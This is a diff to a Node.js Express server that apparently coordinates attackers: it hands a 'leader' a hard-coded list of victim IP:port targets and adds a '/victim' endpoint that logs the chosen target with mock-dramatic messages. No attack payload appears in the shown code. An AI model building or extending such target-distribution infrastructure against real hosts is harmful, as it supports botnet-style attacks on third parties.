@@ -14,6 +14,7 @@ app.use(bodyParser.urlencoded({ extended: true })); // support encoded bodies
 
 var connectedAttackers = 0;
 var leader = "";
+var victim = "";
 
 // Callback function when a HTTP POST method is requested, in the path '/iot-device'
 // Converts iot-device received data to a format understood by the web client
@@ -84,11 +85,18 @@ app.post("/leader", function(req, res) {
 		leader = req.body.leader;
 		console.log("The leader is: " + leader);
 		//Send array of victims
-		//res.send(ARRAY);
+		res.send(["134.123.123.12:454", "5.5.5.5:564"]);
 	} else {
 		res.send("LEADER");
 	}
 });
+
+app.post("/victim", function(req, res) {
+	victim = req.body.victim;
+	console.log(victim + " is going to die!");
+	console.log("God have mercy on it's soul...");
+	res.sendStatus(200);
+}) 
 
 // Callback function when a 'connection' socket message is received
 // When a client connection is established
